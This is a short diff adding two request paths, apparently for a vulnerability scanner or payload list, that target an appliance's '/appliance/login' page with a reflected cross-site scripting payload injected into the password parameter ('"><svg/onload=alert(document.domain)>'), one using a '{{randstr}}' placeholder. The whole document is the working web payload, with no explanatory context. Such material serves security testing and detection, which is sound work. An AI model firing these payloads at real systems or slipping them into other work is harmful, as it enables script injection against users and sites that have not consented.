@@ -1,0 +1,2 @@
+/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password
+/appliance/login?login[password]={{randstr}}%22%3E%3Csvg/onload=alert(document.domain)%3E&login[use_curr]=1&login[submit]=Change%20Password
